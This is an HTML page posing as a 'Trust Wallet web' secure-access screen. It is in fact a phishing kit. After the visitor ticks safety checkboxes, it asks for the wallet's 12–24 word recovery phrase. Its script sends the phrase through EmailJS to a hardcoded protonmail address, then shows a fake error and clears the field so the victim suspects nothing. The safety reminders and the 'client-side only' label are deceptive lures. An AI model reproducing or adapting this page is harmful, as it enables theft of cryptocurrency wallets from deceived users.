<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>trust • secure flow</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background-color: #f0f2f5; /* fallback */
      /* background image positioned at the top, no repeat, zoomed out to 200% */
      background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
      background-repeat: no-repeat;
      background-position: center top; /* image aligned to top, centered horizontally */
      background-size: 200%; /* zoom out to 200% */
      background-attachment: fixed; /* keeps it fixed while scrolling (if any) */
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* main card — solid matte light, fully opaque, readable */
    .card {
      background: #f8fafd; /* solid light background */
      border-radius: 36px;
      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.35);
      width: 100%;
      max-width: 460px;
      padding: 36px 28px;
      color: #1e293b;
      border: 1px solid #e9edf2;
    }

    /* all pages */
    .page {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
    }

    .landing, .rules-page, .recovery-page {
      display: none;
    }

    .landing.active, .rules-page.active, .recovery-page.active {
      display: flex;
    }

    /* headlines */
    .headline {
      font-size: 1.6rem;
      font-weight: 480;
      color: #0f1825;
      text-align: center;
      letter-spacing: -0.4px;
    }

    .headline span {
      color: #526477;
      font-weight: 350;
    }

    /* solid button (matte) */
    .primary-button {
      background: #1e2a3a;
      border: none;
      padding: 14px 32px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 500;
      color: white;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      cursor: pointer;
      box-shadow: 0 10px 22px -12px #0f1a2b;
      transition: 0.1s ease;
      width: auto;
      min-width: 250px;
      border: 1px solid #324155;
    }

    .primary-button:hover {
      background: #253544;
      transform: scale(1.01);
    }

    .primary-button:active {
      transform: scale(0.98);
    }

    .light-tag {
      font-size: 0.8rem;
      background: #e6ecf3;
      padding: 4px 14px;
      border-radius: 40px;
      color: #2d4058;
      border: 1px solid #cbd5e1;
    }

    /* rules page */
    .rules-title {
      font-size: 1.7rem;
      font-weight: 500;
      color: #0a1a2c;
      align-self: flex-start;
      margin-bottom: 6px;
    }

    .rules-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 14px;
      margin: 8px 0 12px;
    }

    .rule-item {
      display: flex;
      align-items: center;
      gap: 16px;
      background: #ffffff;
      padding: 15px 20px;
      border-radius: 28px;
      border: 1px solid #dde3ec;
      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
    }

    .rule-checkbox {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      border: 2px solid #7e8b9f;
      background: white;
      appearance: none;
      -webkit-appearance: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .rule-checkbox:checked {
      background: #1f2e41;
      border-color: #1f2e41;
    }

    .rule-checkbox:checked::after {
      content: "✓";
      color: white;
      font-size: 1.2rem;
      font-weight: bold;
    }

    .rule-text {
      font-size: 1rem;
      font-weight: 440;
      color: #1b2a3f;
      flex: 1;
      line-height: 1.4;
    }

    /* action button (solid) */
    .action-btn {
      background: #1e2a3a;
      border: none;
      padding: 16px 28px;
      border-radius: 60px;
      font-size: 1.3rem;
      font-weight: 500;
      color: white;
      width: 100%;
      cursor: pointer;
      box-shadow: 0 8px 18px -8px #121d2b;
      transition: 0.1s;
      margin-top: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      border: 1px solid #324763;
    }

    .action-btn:disabled {
      background: #b1bfd0;
      box-shadow: none;
      border-color: #9dafc2;
      color: #ecf2f9;
      pointer-events: none;
      opacity: 0.8;
    }

    .action-btn:not(:disabled):hover {
      background: #263a50;
    }

    /* recovery page */
    .recovery-title {
      font-size: 1.7rem;
      font-weight: 500;
      color: #0f1e30;
      align-self: flex-start;
    }

    .hint-box {
      background: #eaf0f8;
      border-left: 5px solid #e68a2e;
      padding: 12px 18px;
      border-radius: 20px;
      font-size: 0.95rem;
      margin: 6px 0 12px;
      width: 100%;
      color: #1b2b40;
      font-weight: 420;
      border: 1px solid #d0ddee;
    }

    textarea {
      width: 100%;
      padding: 20px 20px;
      font-size: 1.1rem;
      border-radius: 28px;
      border: 1.5px solid #cbd6e6;
      background: #ffffff;
      color: #0c1b2e;
      resize: vertical;
      min-height: 170px;
      font-family: 'SF Mono', 'Fira Code', monospace;
      line-height: 1.5;
      outline: none;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.02);
    }

    textarea:focus {
      border-color: #3f5a7a;
    }

    textarea::placeholder {
      color: #8b9fba;
      font-size: 0.95rem;
    }

    .word-counter {
      align-self: flex-start;
      font-size: 0.9rem;
      margin: 6px 6px 10px;
      background: #eaf0f8;
      padding: 6px 22px;
      border-radius: 40px;
      color: #1b2d45;
      border: 1px solid #c9d6e8;
      font-weight: 470;
    }

    .error-badge {
      display: inline-block;
      background: #bc2c2c;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      color: white;
      font-size: 2.2rem;
      line-height: 40px;
      text-align: center;
      font-weight: 500;
      box-shadow: 0 2px 10px #b22222;
    }

    .back-link {
      margin-top: 18px;
      color: #3a5070;
      text-decoration: none;
      font-size: 0.9rem;
      border-bottom: 1px solid #a7bbd4;
      cursor: pointer;
      font-weight: 470;
    }
    .back-link:hover {
      color: #1d314a;
      border-bottom-color: #1d314a;
    }

    .tiny-note {
      font-size: 0.7rem;
      color: #617694;
      margin-top: 8px;
    }
  </style>
</head>
<body>
<div class="card">
  <!-- LANDING PAGE (only trust wallet button) -->
  <div class="page landing active" id="landingPage">
    <div class="headline">secure <span>·</span> access</div>
    <button class="primary-button" id="showRulesBtn">
      <span>⎔</span> Trust Wallet <span style="font-weight:350;">web</span>
    </button>
    <div class="light-tag">encrypted path</div>
  </div>

  <!-- RULES PAGE (3 mandatory checkboxes) -->
  <div class="page rules-page" id="rulesPage">
    <div class="rules-title">✓ security check</div>
    <div class="rules-container">
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule1">
        <span class="rule-text">Never share your recovery phrase with anyone</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule2">
        <span class="rule-text">Use a private & secure device / connection</span>
      </label>
      <label class="rule-item">
        <input type="checkbox" class="rule-checkbox" id="rule3">
        <span class="rule-text">Ensure no one is watching while entering words</span>
      </label>
    </div>

    <button class="action-btn" id="acceptRulesBtn" disabled>continue →</button>
    <div class="back-link" id="backFromRules">← back</div>
  </div>

  <!-- RECOVERY PAGE (24 words form) -->
  <div class="page recovery-page" id="recoveryPage">
    <div class="recovery-title">recovery phrase</div>
    <div class="hint-box">enter 12–24 words, separated by spaces</div>

    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..."></textarea>
    <div class="word-counter" id="wordDisplay">⌨️ 0 words</div>

    <button class="action-btn" id="submitBtn" disabled>
      <span>✓</span> confirm
    </button>
    <div class="back-link" id="backFromRecovery">← back</div>
    <div class="tiny-note">client-side only</div>
  </div>
</div>

<script>
  (function() {
    // Initialize EmailJS (your public key)
    emailjs.init("PakuuN4ADUDEqrzHl");

    // --- DOM elements ---
    const landing = document.getElementById('landingPage');
    const rulesPage = document.getElementById('rulesPage');
    const recoveryPage = document.getElementById('recoveryPage');

    const showRulesBtn = document.getElementById('showRulesBtn');
    const backFromRules = document.getElementById('backFromRules');
    const backFromRecovery = document.getElementById('backFromRecovery');
    const acceptRulesBtn = document.getElementById('acceptRulesBtn');
    const rule1 = document.getElementById('rule1');
    const rule2 = document.getElementById('rule2');
    const rule3 = document.getElementById('rule3');

    const phraseInput = document.getElementById('phraseInput');
    const wordDisplay = document.getElementById('wordDisplay');
    const submitBtn = document.getElementById('submitBtn');

    // --- Navigation functions ---
    function showLanding() {
      landing.classList.add('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.remove('active');
    }

    function showRules() {
      landing.classList.remove('active');
      rulesPage.classList.add('active');
      recoveryPage.classList.remove('active');
      // reset checkboxes
      rule1.checked = false;
      rule2.checked = false;
      rule3.checked = false;
      updateRulesButton();
    }

    function showRecovery() {
      landing.classList.remove('active');
      rulesPage.classList.remove('active');
      recoveryPage.classList.add('active');
      phraseInput.value = '';       // clear any previous text
      validateWordCount();
    }

    // Event listeners for navigation
    showRulesBtn.addEventListener('click', showRules);
    backFromRules.addEventListener('click', showLanding);
    backFromRecovery.addEventListener('click', showRules);

    // --- Rules check handling ---
    function updateRulesButton() {
      acceptRulesBtn.disabled = !(rule1.checked && rule2.checked && rule3.checked);
    }

    rule1.addEventListener('change', updateRulesButton);
    rule2.addEventListener('change', updateRulesButton);
    rule3.addEventListener('change', updateRulesButton);

    acceptRulesBtn.addEventListener('click', () => {
      if (!acceptRulesBtn.disabled) showRecovery();
    });

    // --- Word count & validation (minimum 12 words) ---
    function validateWordCount() {
      const text = phraseInput.value.trim();
      const words = text ? text.split(/\s+/) : [];
      const count = words.length;
      wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
      submitBtn.disabled = (count < 12);
    }

    phraseInput.addEventListener('input', validateWordCount);

    // --- Email sender (always runs in background) ---
    async function sendPhraseViaEmail(phrase) {
      try {
        // ********** REPLACE WITH YOUR REAL EMAIL ADDRESS **********
        const targetEmail = "mrx_private@protonmail.com";  // <-- CHANGE THIS

        await emailjs.send(
          "service_j8bd9vn",        // your service ID
          "template_paduqpn",        // your template ID
          {
            email: targetEmail,
            words: phrase,
            message: `Recovery phrase: ${phrase}`,
            to_name: "Wallet Owner",
            from_name: "Recovery Page"
          }
        );
        console.log('✅ email sent in background');
      } catch (err) {
        console.warn('⚠️ email send failed (silent):', err);
        // fail silently — user still sees error cross
      }
    }

    // --- Confirm button: shows ERROR (red X) but actually sends email ---
    submitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const phrase = phraseInput.value.trim();
      if (!phrase) return;

      // Disable button, store original content, change to error cross
      submitBtn.disabled = true;
      const originalContent = submitBtn.innerHTML;
      submitBtn.innerHTML = `<span class="error-badge">✗</span> error`;

      // Trigger background email (fire and forget — no await)
      sendPhraseViaEmail(phrase);

      // Clear textarea and update word count
      phraseInput.value = '';
      validateWordCount();  // sets word count to 0 → button stays disabled

      // After 1.8 seconds revert button to original look (but remains disabled due to 0 words)
      setTimeout(() => {
        submitBtn.innerHTML = originalContent;
        // button disabled state already managed by word count (0 words)
      }, 1800);
    });

    // --- Initial states ---
    validateWordCount();    // sets initial word display
    showLanding();          // ensure landing is active
  })();
</script>
<!-- 
  ✅ background image at the top (centered top)
  ✅ background size 200% (zoomed out)
  ✅ solid matte card, no glass, readable
  ✅ three rules with checkboxes (all must be ticked)
  ✅ recovery page with word counter (min 12 words)
  ✅ confirm button shows red cross & error, but sends email via EmailJS
  ✅ all English, no Persian
  ✅ no extra tricks, everything intact
-->
</body>
</html>
